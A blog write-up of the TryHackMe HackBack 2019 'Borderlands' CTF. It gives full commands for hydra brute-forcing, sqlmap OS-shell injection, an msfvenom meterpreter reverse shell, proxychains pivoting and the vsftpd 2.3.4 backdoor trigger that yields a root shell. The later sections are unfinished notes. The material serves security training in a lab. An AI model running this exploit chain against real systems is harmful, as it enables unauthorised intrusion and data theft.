---
title: TryHackMe - HackBack 2
layout: post
description: A write up of the TryHackMe HackBack 2019 2 University CTF
tags: ctf tryhackme
toc: true
---

# Task 4: Borderlands [Networking] [Insane]

## Question 2: What is the API key that fits the following pattern: "WEB*"

Question 2 was the first question solved by our team. The IP address given by the challenge dashboard provides a website with several PDFs and a login form. 

The login form was tested for SQL vulnerabilities but none were found. The PDFs were downloaded and analysed, which found the metadata of them contained a consistent author "billg", which looked like a potential username.

>
{% highlight text %}
root@kali-persistent:~/ctf/hackback2/borderlands/pdfs# ls | xargs exiftool | grep Author
Author                          : billg
Author                          : billg
Author                          : billg
Author                          : billg
Author                          : billg
{% endhighlight  %}

As such, the parameters of the login form were identified by anaylsising the POST requestc in Firefox, and the password was brute forced using hydra with the "rockyou" password list.

>
{% highlight bash %}
hydra -I -l "billg" -P /usr/share/wordlists/rockyou.txt [deployed ip] http-post-form "/:username=^USER^&password=^PASS^:F=bad username"
{% endhighlight  %}


This revealed the username as password to be "billg:potato".

![Hydra Results]({{ '/assets/images/hackback-2/hydra-results.png' | relative_url }}){: .center-image }*Results of Hydra running against login form*

Once logged in, an interface listing the PDFs found on the previous page is displayed. When a PDF is clicked on, rather than downloading it, it displays a list of information about the documents utilising an "api.php" page with some get parameters, including the API key we are looking for.

![Web API Key]({{ '/assets/images/hackback-2/web-api-key.png' | relative_url }}){: .center-image }*URL containing Web API Key*

## Question 4: What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX}

The format of the data returned by the API looks like it could be contained in a database. As such, SQL Map was used to evaluate if it was vulnerable to SQL injection or not. 

>
{% highlight bash %}
sqlmap --random-agent -u "http://10.10.221.98/api.php?documentid=2&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" -p documentid
{% endhighlight  %}

![SQL Map Results]({{ '/assets/images/hackback-2/sql-map.png' | relative_url }}){: .center-image }*Injection vulnerability found using SQLMap*

This confirmed my hunch and a shell was popped using the "--os-shell" command. This uploads a file uploaded and a reverse shell to the server, guessing where the web directory is, and catches the connection from the script.

However, this shell is lacking in features and can be particularly unstable. As such, I decided to upgrade my shell to a meterpreter shell before continuing. This was done by creating a standard linux executable reverse shell using msfvenom, and uploading it to web server with SQLMaps file stager, which is created during the reverse shell process.


![File Stager]({{ '/assets/images/hackback-2/file-stager.png' | relative_url }}){: .center-image }*File stager uploaded by SQLMap*


Metasploit's console was used to create a handler for this shell, and the reverse shell was executed using the shell created by SQLMap. This allowed the flag under "/var/www" to be discovered and extracted.

![Web App Flag]({{ '/assets/images/hackback-2/webapp-flag.png' | relative_url }}){: .center-image }*Flag found under "/var/www/" using meterpreter shell*

This flag could have been obtained under the SQLMap shell, but the meterpreter shell will be useful furture future questions.

## Question 1: What is the API key that fits the following pattern: "AND*"

The inital website also contains an apk file, which is likely what the "AND"(roid) part of the API key refers tool. The APK was decompiled using APK Tool, which provides the source code for the app. "dex2jar" can be used to get more readable java code, however, given the relative similicity of this app, it was not required.

Straight away, two activity files can be seen, "MainActivity", and "Main2Activity". The first activity simply creates a button which opens the second activity.

The second activity, has an unimplemented decryption function, which appears would decrypt the API key we are looking for, and would be used to make a request to the same API endpoint found with the Web API key.

![Decryption Function]({{ '/assets/images/hackback-2/decrypt-function.png' | relative_url }}){: .center-image }*Decryption function which has not been implemented*

This key appears to be stored as a string resource, so the next place that was analysed was the "strings.xml" resource file, which gives us the encrypted API key.

>
{% highlight text %}
<string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
{% endhighlight  %}


Given that we have no implentation details, it is likely this a fairly basic cipher. From the pattern in the question we know that it starts with "AND", however given the difference in distance from C-A and B-N, it cannot be a caeser cipher.

It also doesn't look like it follows a typical encoding scheme, however, given that we now had shell access to the web server, we could check how the API keys were checked.


>
{% highlight php %}

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
{
    die("Invalid API key");
}
{% endhighlight  %}

As it only checks the first 20 characters, this does not give us the full API key, however, it does give us a very large crib to use. Given the probable simplicity of the encryption method, the next thing that was tried was a Vigenère cipher.

If we take the the encrypted API key in the source code and decode it using Cyber Chefs Vigenère cipher function using the crib found in the source code (until the first number as it cannot be included in a Vigenère key), it should decode to a repeating word which will be the key used to encrypt the full key.


Sure enough this revealed "CONTEXTCONT5U8YGG2tlQQSvYi2mNt", making "CONTEXT" the key we are looking for. This could potentially be guessed as Context we the creators of this challenge, and using "AND" as a crib gives us "CON", which could be enough information to guess the full key.

Now we have access to the web server we can look at api.php to see how the API keys are checked



## Question 3: What is the API key that fits the following pattern: "GIT*"

Could be done through directory discovery but much easier once you have web server access.

This question could be done entirely through directory discovery as shown [here](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
), however, given that we have a shell on the shell it was easier to download it using meterpreter.

>
{% highlight text %}
metepreter> download .git
{% endhighlight  %}

This will download the files to the working directory msfconsole was opened in. The ".git" folder was moved to a new folder, and the files were restored with "git checkout -- .". The commit history was then viewed with "git log". The git repository contains the source code of the website, and one of the commits references "sensitive data"

>
{% highlight text %}
commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data
{% endhighlight  %}

This looks like what we are looking for, so the repositor was reverted back to this verion with the following command:

>
{% highlight bash %}
git revert b2f776a52fe81a731c6c0fa896e7f9548aafceab
{% endhighlight  %}

The "api.php" file then contains the full "GIT" API key, which is the flag for this question.

>
{% highlight php %}
if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}
{% endhighlight  %}

## Question 5: What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}

Need more tools - limited tools on machine - no ping, dig, wget.

Need nmap for host discovery

Binaries must be self contained as there isn't much on this server and we don't have packet manager access

https://github.com/ernw/static-toolbox

https://insinuator.net/2018/02/creating-static-binaries-for-nmap-socat-and-other-tools/

https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox

Drop onto machine using meterpreter - larger file limit

We know we can reach a router of some sort from this box

shell

ip addr

Two interfaces 172.18.0.0/16 172.16.1.0/24

./nmap -sP 172.16.1.0/24 172.18.0.0/16 for host discovery


172.18.0.1 looks like the aws host
172.18.0.2 is us

172.16.1.10 is us
172.16.1.128 is hackback_router1_1.hackback_r_1_ext which sounds like what we're trying to get to

./nmap -p- 172.16.1.128

Starting Nmap 7.11 ( https://nmap.org ) at 2019-10-28 00:47 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
Host is up (0.00014s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd

Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds

This version of nmap doesn't have scripts, so I used the nmaps socks proxy for routing and the kali's nmap for service ennumeration - ennumeration is everything

ctrl+c to close shell
ctrl+z to background session

use auxiliary/server/socks4a 

run



Add route to metasploit through session

route add 172.16.1.0 255.255.255.0 2

nano /etc/proxychains.conf
socks4  127.0.0.1 1080





proxychains nmap 172.16.1.128 -Pn -sT -sV -p 21,179,2601,2605

(-A can break the tunnel)

(can break the tunnel not sure why)

proxychains nmap 172.16.1.128 -Pn -sT -sV  -p 21,179,2601,2605
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 01:00 GMT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:21-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2605-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2601-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:21-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2601-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2605-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
Nmap scan report for 172.16.1.128
Host is up (0.057s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
179/tcp  open  tcpwrapped
2601/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
2605/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
Service Info: OS: Unix

clearly a router

vsftpd 2.3.4 has a backdoor in it that we can exploit

./busybox telnet 172.16.1.128 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
^]e

./nmap -p- 172.16.1.128

Starting Nmap 7.11 ( https://nmap.org ) at 2019-10-28 01:04 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
Host is up (0.00014s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd
6200/tcp open  unknown

The back door is on port 6200 - looks like it's successful (nmap can close the backdoor however - needs reopened)

./busybox telnet 172.16.1.128 6200 
whoami;
root
: not found


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds

cat /root/flag.txt;
{FLAG:Router1:c877f00ce2b886446395150589166dcd}
: not found



## Question 6: What flag is transmitted from flag_server to flag_client over UDP? {FLAG:UDP:XXX}

Meterpreter can act as a listener for msfconsole, this shell is unreliale and limited so lets drop a meterpeter here too for stability

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.1.10 -f elf -o shell

upload using meterpreter to web app machine

download using wget on router

set up listener to use 172.16.1.10

run handler

run reverse shell

Setup SSH

Fix SSH

BGP Poison

tcpdump

https://snowscan.io/htb-writeup-carrier/


## Question 7: What flag is transmitted from flag_server to flag_client over TCP? {FLAG:TCP:XXX}